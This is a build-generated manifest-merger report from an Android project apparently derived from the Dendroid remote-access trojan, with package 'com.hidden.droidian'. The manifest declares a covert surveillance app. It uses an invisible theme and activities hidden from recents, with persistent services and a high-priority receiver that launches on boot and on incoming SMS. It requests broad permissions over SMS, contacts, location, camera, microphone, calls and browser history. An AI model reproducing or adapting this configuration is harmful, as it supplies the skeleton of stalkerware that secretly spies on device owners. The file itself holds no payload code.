DendroidAPKimport/Droidian/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.hidden.droidian"
4    android:versionCode="2"
5    android:versionName="2.0" >
6
7    <uses-sdk
7-->src\main\AndroidManifest.xml:6:5-44
8        android:minSdkVersion="10"
8-->src\main\AndroidManifest.xml:6:5-44
9        android:targetSdkVersion="18" />
9-->src\main\AndroidManifest.xml:6:5-44
10
11    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
11-->src\main\AndroidManifest.xml:7:5-81
11-->src\main\AndroidManifest.xml:7:22-78
12
13    <supports-screens
13-->src\main\AndroidManifest.xml:9:2-12:17
14        android:largeScreens="true"
14-->src\main\AndroidManifest.xml:10:15-42
15        android:resizeable="true"
15-->src\main\AndroidManifest.xml:9:20-45
16        android:xlargeScreens="true" />
16-->src\main\AndroidManifest.xml:11:15-43
17
18    <uses-permission
18-->src\main\AndroidManifest.xml:65:1-97
19        android:name="android.permission.QUICKBOOT_POWERON"
19-->src\main\AndroidManifest.xml:65:18-69
20        android:required="false" />
20-->src\main\AndroidManifest.xml:65:70-94
21    <uses-permission
21-->src\main\AndroidManifest.xml:66:1-86
22        android:name="android.permission.INTERNET"
22-->src\main\AndroidManifest.xml:66:18-60
23        android:required="true" />
23-->src\main\AndroidManifest.xml:66:61-84
24    <uses-permission
24-->src\main\AndroidManifest.xml:67:1-87
25        android:name="android.permission.READ_SMS"
25-->src\main\AndroidManifest.xml:67:18-60
26        android:required="true" />
26-->src\main\AndroidManifest.xml:67:61-84
27    <uses-permission
27-->src\main\AndroidManifest.xml:68:1-88
28        android:name="android.permission.WRITE_SMS"
28-->src\main\AndroidManifest.xml:68:18-61
29        android:required="true" />
29-->src\main\AndroidManifest.xml:68:62-85
30    <uses-permission
30-->src\main\AndroidManifest.xml:69:1-91
31        android:name="android.permission.GET_ACCOUNTS"
31-->src\main\AndroidManifest.xml:69:18-64
32        android:required="true" />
32-->src\main\AndroidManifest.xml:69:65-88
33    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
33-->src\main\AndroidManifest.xml:70:1-88
33-->src\main\AndroidManifest.xml:70:18-86
34    <uses-permission
34-->src\main\AndroidManifest.xml:71:1-98
35        android:name="android.permission.ACCESS_NETWORK_STATE"
35-->src\main\AndroidManifest.xml:71:18-72
36        android:required="true" />
36-->src\main\AndroidManifest.xml:71:73-96
37    <uses-permission
37-->src\main\AndroidManifest.xml:72:1-92
38        android:name="android.permission.READ_CONTACTS"
38-->src\main\AndroidManifest.xml:72:18-65
39        android:required="true" />
39-->src\main\AndroidManifest.xml:72:66-89
40    <uses-permission
40-->src\main\AndroidManifest.xml:73:1-99
41        android:name="android.permission.ACCESS_FINE_LOCATION"
41-->src\main\AndroidManifest.xml:73:18-72
42        android:required="true" />
42-->src\main\AndroidManifest.xml:73:73-96
43    <uses-permission
43-->src\main\AndroidManifest.xml:74:1-88
44        android:name="android.permission.GET_TASKS"
44-->src\main\AndroidManifest.xml:74:18-61
45        android:required="true" />
45-->src\main\AndroidManifest.xml:74:62-85
46    <uses-permission
46-->src\main\AndroidManifest.xml:75:1-89
47        android:name="android.permission.WAKE_LOCK"
47-->src\main\AndroidManifest.xml:75:18-61
48        android:required="false" />
48-->src\main\AndroidManifest.xml:75:62-86
49    <uses-permission
49-->src\main\AndroidManifest.xml:76:1-89
50        android:name="android.permission.CALL_PHONE"
50-->src\main\AndroidManifest.xml:76:18-62
51        android:required="true" />
51-->src\main\AndroidManifest.xml:76:63-86
52    <uses-permission
52-->src\main\AndroidManifest.xml:77:1-87
53        android:name="android.permission.SEND_SMS"
53-->src\main\AndroidManifest.xml:77:18-60
54        android:required="true" />
54-->src\main\AndroidManifest.xml:77:61-84
55    <uses-permission
55-->src\main\AndroidManifest.xml:78:1-94
56        android:name="android.permission.WRITE_SETTINGS"
56-->src\main\AndroidManifest.xml:78:18-66
57        android:required="false" />
57-->src\main\AndroidManifest.xml:78:67-91
58    <uses-permission
58-->src\main\AndroidManifest.xml:79:1-96
59        android:name="android.permission.READ_PHONE_STATE"
59-->src\main\AndroidManifest.xml:79:18-68
60        android:required="false" />
60-->src\main\AndroidManifest.xml:79:69-93
61    <uses-permission
61-->src\main\AndroidManifest.xml:80:1-101
62        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
62-->src\main\AndroidManifest.xml:80:18-74
63        android:required="true" />
63-->src\main\AndroidManifest.xml:80:75-98
64    <uses-permission
64-->src\main\AndroidManifest.xml:81:1-85
65        android:name="android.permission.CAMERA"
65-->src\main\AndroidManifest.xml:81:18-58
66        android:required="true" />
66-->src\main\AndroidManifest.xml:81:59-82
67    <uses-permission
67-->src\main\AndroidManifest.xml:82:1-92
68        android:name="android.permission.RECORD_AUDIO"
68-->src\main\AndroidManifest.xml:82:18-64
69        android:required="false" />
69-->src\main\AndroidManifest.xml:82:65-89
70    <uses-permission
70-->src\main\AndroidManifest.xml:83:1-101
71        android:name="android.permission.PROCESS_OUTGOING_CALLS"
71-->src\main\AndroidManifest.xml:83:18-74
72        android:required="true" />
72-->src\main\AndroidManifest.xml:83:75-98
73    <uses-permission
73-->src\main\AndroidManifest.xml:84:1-90
74        android:name="android.permission.RECEIVE_SMS"
74-->src\main\AndroidManifest.xml:84:18-63
75        android:required="true" />
75-->src\main\AndroidManifest.xml:84:64-87
76
77    <uses-feature
77-->src\main\AndroidManifest.xml:85:1-81
78        android:name="android.hardware.camera"
78-->src\main\AndroidManifest.xml:85:15-53
79        android:required="false" />
79-->src\main\AndroidManifest.xml:85:54-78
80    <uses-feature
80-->src\main\AndroidManifest.xml:86:1-87
81        android:name="android.hardware.camera.front"
81-->src\main\AndroidManifest.xml:86:15-59
82        android:required="false" />
82-->src\main\AndroidManifest.xml:86:60-84
83    <uses-feature
83-->src\main\AndroidManifest.xml:87:1-91
84        android:name="android.hardware.camera.autofocus"
84-->src\main\AndroidManifest.xml:87:15-63
85        android:required="false" />
85-->src\main\AndroidManifest.xml:87:64-88
86    <uses-feature
86-->src\main\AndroidManifest.xml:88:1-85
87        android:name="android.hardware.microphone"
87-->src\main\AndroidManifest.xml:88:15-57
88        android:required="false" />
88-->src\main\AndroidManifest.xml:88:58-82
89
90    <application
90-->src\main\AndroidManifest.xml:14:5-63:19
91        android:allowBackup="false"
91-->src\main\AndroidManifest.xml:18:3-30
92        android:debuggable="true"
93        android:icon="@drawable/launcher"
93-->src\main\AndroidManifest.xml:15:9-42
94        android:label="@string/app_name"
94-->src\main\AndroidManifest.xml:16:9-41
95        android:persistent="true"
95-->src\main\AndroidManifest.xml:19:3-28
96        android:testOnly="true"
97        android:theme="@style/Invisible" >
97-->src\main\AndroidManifest.xml:17:3-35
98        <activity
98-->src\main\AndroidManifest.xml:20:9-27:20
99            android:name="com.connect.Droidian"
99-->src\main\AndroidManifest.xml:21:13-48
100            android:excludeFromRecents="true" >
100-->src\main\AndroidManifest.xml:22:13-46
101            <intent-filter>
101-->src\main\AndroidManifest.xml:23:17-26:22
102                <action android:name="android.intent.action.MAIN" />
102-->src\main\AndroidManifest.xml:24:17-69
102-->src\main\AndroidManifest.xml:24:25-66
103
104                <category android:name="android.intent.category.LAUNCHER" />
104-->src\main\AndroidManifest.xml:25:18-78
104-->src\main\AndroidManifest.xml:25:28-75
105            </intent-filter>
106        </activity>
107        <activity
107-->src\main\AndroidManifest.xml:28:9-31:20
108            android:name="com.connect.Dialog"
108-->src\main\AndroidManifest.xml:29:13-46
109            android:excludeFromRecents="true" >
109-->src\main\AndroidManifest.xml:30:13-46
110        </activity>
111        <activity
111-->src\main\AndroidManifest.xml:32:9-35:20
112            android:name="com.connect.CaptureCameraImage"
112-->src\main\AndroidManifest.xml:33:13-58
113            android:excludeFromRecents="true" >
113-->src\main\AndroidManifest.xml:34:13-46
114        </activity>
115        <activity
115-->src\main\AndroidManifest.xml:36:9-39:20
116            android:name="com.connect.CameraView"
116-->src\main\AndroidManifest.xml:37:13-50
117            android:excludeFromRecents="true" >
117-->src\main\AndroidManifest.xml:38:13-46
118        </activity>
119        <activity
119-->src\main\AndroidManifest.xml:40:9-43:20
120            android:name="com.connect.VideoView"
120-->src\main\AndroidManifest.xml:41:13-49
121            android:excludeFromRecents="true" >
121-->src\main\AndroidManifest.xml:42:13-46
122        </activity>
123
124        <service
124-->src\main\AndroidManifest.xml:44:9-48:19
125            android:name="com.connect.DroidianService"
125-->src\main\AndroidManifest.xml:44:18-60
126            android:enabled="true"
126-->src\main\AndroidManifest.xml:45:13-35
127            android:exported="true"
127-->src\main\AndroidManifest.xml:46:13-36
128            android:persistent="true" >
128-->src\main\AndroidManifest.xml:47:13-38
129        </service>
130        <service android:name="com.connect.RecordService" >
130-->src\main\AndroidManifest.xml:49:9-50:19
130-->src\main\AndroidManifest.xml:49:18-58
131        </service>
132
133        <receiver
133-->src\main\AndroidManifest.xml:51:18-62:20
134            android:name="com.connect.ServiceReceiver"
134-->src\main\AndroidManifest.xml:51:28-70
135            android:enabled="true"
135-->src\main\AndroidManifest.xml:52:20-42
136            android:exported="true"
136-->src\main\AndroidManifest.xml:53:20-43
137            android:persistent="true" >
137-->src\main\AndroidManifest.xml:54:20-45
138            <intent-filter android:priority="1000" >
138-->src\main\AndroidManifest.xml:55:13-61:29
138-->src\main\AndroidManifest.xml:55:28-51
139                <action android:name="android.intent.action.BOOT_COMPLETED" />
139-->src\main\AndroidManifest.xml:56:9-71
139-->src\main\AndroidManifest.xml:56:17-68
140                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
140-->src\main\AndroidManifest.xml:57:21-86
140-->src\main\AndroidManifest.xml:57:29-83
141                <action android:name="android.intent.action.PHONE_STATE" />
141-->src\main\AndroidManifest.xml:58:15-74
141-->src\main\AndroidManifest.xml:58:23-71
142                <action android:name="android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE" />
142-->src\main\AndroidManifest.xml:59:15-100
142-->src\main\AndroidManifest.xml:59:23-98
143                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
143-->src\main\AndroidManifest.xml:60:15-80
143-->src\main\AndroidManifest.xml:60:23-77
144            </intent-filter>
145        </receiver>
146    </application>
147
148</manifest>